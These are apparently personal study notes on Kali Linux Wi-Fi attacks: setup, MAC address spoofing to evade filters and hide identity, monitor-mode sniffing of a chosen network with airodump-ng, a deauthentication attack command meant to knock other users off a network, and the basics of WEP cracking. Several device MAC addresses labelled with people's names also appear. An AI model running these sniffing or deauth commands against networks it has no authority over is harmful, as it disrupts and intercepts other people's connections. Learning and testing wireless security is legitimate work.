KALI LINUX


// Content  
//0   ::  BASIC
//1   ::  Commands
//2   ::  Network
//3   ::  Packet Sniffing Tool :: airodump-ng
//4   ::  WEP :: Wired Equivalent Privacy
//5   ::  
//6   ::  
//7   ::  
//8   ::  
//9   ::  
//10  ::  
//11  ::  
//12  ::  
//13  :: 
//14  :: 
//15  :: 


// 0
// KaliLinux Software Download Link
https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/
	>Linux Setting
		> Use: NAT Network
		>
	
// BASIC
USER:: root
Pass:: toor

// SNAPSHOTS
	> GOBACK OR RESTORE POINT
>RTclick Kali > click > Click Camera (Take) > oK
> Later Click on SnapShot > Restore.	

// USB WIFI 
		https://www.youtube.com/watch?v=0lqRZ3MWPXY
		CHIPSET:: Atheros AR9271  -2.4GHZ no 5.0 GHZ  - Supports All
				-Alfa AWUS036NHA(LongRange, bit better)
		CHIPSET:: Realtek AR8812AU  -2.4GHZ    5GHZ   - Support All , Latest have many Bugs
				-Alfa AWUS036ACH
// 
Ctrl + L // > Url search in Linux

// WIFI
leaxsys wifi Dongle
	CHIPSET:: Atheros AR9271
	mac:: es:ca:0f:e1:09:fb  //mac/ether address

// Our WifiRouter ID
C0:25:E9:41:39:EE

// MyLPwifiId
80:2B:F9:3A:BC:21
//MyPhoneId
64:A2:F9:8E:DA:06
// HarshLP
00:E1:8C:B6:12:73
// NIKHIL
6C:C4:D5:65:28:46




// 1
// Commands
	// https://www.mediacollege.com/linux/command/linux-command.html
man ANYCMD     // mannual   :: man ls, man pwd 
ANYCMD --help  // help with Examples
pwd
ls
cd fileName
cd ..
sh filename // Run file Command in Shell
apt-get update  // update  apt-get: Getapp APPNAME
apt-get install ANYAPPNAME // apt-get install terminator
Anycommand --write Filename  // Write in file // ? CheckWorkingStatus
ifconfig // Check Wifi and Lan
ifconfig wlan0 down // To disable
airmon-ng // wifi details
airmon-ng check kill // Totally kill network 
ifconfig wlan0 hw ether 00:11:22:33:44:55//hw=hardware // address must star with 00:
ifconfig wlan0 up   // To Enable
leafpad ANYFILENAME // TestEditor
leafpad /etc/NetworkManager/NetworkManager.conf   // NetworkManager.conf contains configration !!!
service network-manager restart   // Restart the Network manager 
man airodump-ng
airodump-ng wlan0   // show all wifi's 
airodump-ng --band a wlan0 // lan name  // a 5Ghz  // b g 2.5ghz
airmon-ng check wlan0 // Check
wireshark  // ToOpenWireShark
aireplay-ng --deauth 100000000 -a 00:11:22:33:44:55BssidRouter -c 00:11:22:33:44:55StationClient wlan0 // ToDisconnect Other  // RouterMac ClintMac
man aireplay-ng // Documentation
aireplay-ng --help  // Documentation
// 2
// Network
Client >|(PacketOfData)Request|> Server/AccessPoint(Router_Home)>ResourceInternet
PacketOfData Wifi in Air Can get to know any Request !
// Wifi Setting
	>Kali-Linux>Setting>USB>CheckUsb>Usb2Type>Add>WifiLan.
	>InLinux>Device>Usb>CheckWifi
ifconfig // Check Wifi and Lan
	--Network
		-eth = virtual network
		-lo: = Lan network
		-wlan0= wifi Network
			inet = IpAddress
			ether = MacAddress
// MAC Address   --With in the Network.To Detect LOCAL Devices.  
	MAC = Media Access Control
		Permanent address
		Physical
		Unique // No two divice will have same divice.
			// Same Mac number nomatter which computer is attached
	
	--Network Communication
		-Source mac: 00:11:11:11:11
		-Destination mac: 00:22:22:22:22
		
// IP Address is used IN INTERNET to Detect the Device(Computers)
192.168.1.1

// Chanbe MAC Address
	-Increse anonymous
	-Surpass Filter
	-Hide Identity
  -Disable and change any divice mac address. // changing mac Program BAse not hardware base
ifconfig wlan0 down // To disable
airmon-ng check kill // Totally kill network 
ifconfig wlan0 hw ether 00:11:22:33:44:55//hw=hardware // address must star with 00:
ifconfig wlan0 up   // To Enable
	-- // On Restart Computer MAC will be default mac of divice .
	
// If mac address NOt changeing
leafpad /etc/NetworkManager/NetworkManager.conf // leafpad is textpad  // NetworkManager.conf contains configration !!!

	>Add  -Copy the below stuff in  /NetworkManager.conf // will say not to change mac aaddrss
		[device]
		wifi.scan-rand-mac-address=no
		[connection]
		ethernet.cloned-mac-address=preserve
		wifi.cloned-mac-address=preserve
		
			[device]
		wifi.scan-rand-mac-address=no
		[connection]
		ethernet.cloned-mac-address=preserve
		wifi.cloned-mac-address=preserve
		
		


	//Data transform from 
	SOURCE MAC  to  DESTINATION MAC
		// data packet will read only if have DESTINATION MAC ID SOURCE MAC ID
iwconfig // Check wifi Mode // WIRELESS INTERFACES ONLY 
	default mode = Managed  // Catch those packets whose Destination MAC = my mac id 
	mode: monitor // Catch all packets of all MAC ids 

// change mode
	// Method 1
	ifconfig wlan0 down
	airmon-ng check kill // No internet  / No network
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up // up == on ?
	
	// Method 2
	ifconfig wlan0 down
	airmon-ng check kill
	airmon-ng start wlan0
	iwconfig // wlan0mon  - NewName not wlan0

// 3	
// Packet Sniffing Tool
  // airodump-ng
	https://linux.die.net/man/1/airodump-ng
	https://www.aircrack-ng.org/doku.php?id=airodump-ng
	https://www.kismetwireless.net/docs/readme/gps/
	
 // SniffStart
 airodump-ng wlan0 // wlan0 or lanName // Check using iwconfig
    Ctrl + C // Quit

IVs (Initialization Vector) 

	BSSID = mac address
	PWR = Signal Power //  -50 -20  // -20 is good signal
	BEACONS = frames //show its Existance
	#DATA = No of data Packets 
	#/s = No of data packets collects
	CH = Channels working
	MB = Speed of network
	ENC = Encription
	CIPHER = CIPHER USING IN THE NETWORK
	AUTH = AUTHENTATION USE OF NETWORK
	ESSID = NAMES OF NETWORK

 airodump-ng band a  wlan0 // band 2.5Ghz of 5 Ghz  : a = 5GHZ b and g 2.4 Ghz
 airodump-ng band abg  wlan0 //  abg //both bands
 
  // Target specific Network
  airodump-ng --bssid 00:11:22:33:44:55 wlan0
 airodump-ng --bssid 00:11:22:33:44:55 --channel 1 wlan0
 airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write FileName wlan0
			// MacSpecific:OfReqireNetwork    // Channel  // StoreInFile // thorugh our lanDongle
					
//CREATES 5 FILES
	-FileName.cap  // MainFile Packets Files
	-FileName.kismet.netxml
	-FileName.csv
	-FileName.log.csv
	-FileName.kismet.csv

// WireShark - To Analyse data
wireshark  // ToOpenWireShark
	-Open and Select File.cap
	
// Disconnect Other WifiNetwork Connection
- Change you Mac Address as theirs & and Say as disconnect

aireplay-ng --deauth 100000000 -a 00:11:22:33:44:55Bssid -c 00:11:22:33:44:55Station wlan0
		// Deauthentaticion Attack 100000timesAttack // mac address
		


// 4  
// WEP  :: Wired Equivalent Privacy
RC4 Algorither:
	Key*(data)  
	IV
	Send as Plain text
	24bit 
	
	aircrack-ng  // to Analyse and Crack
	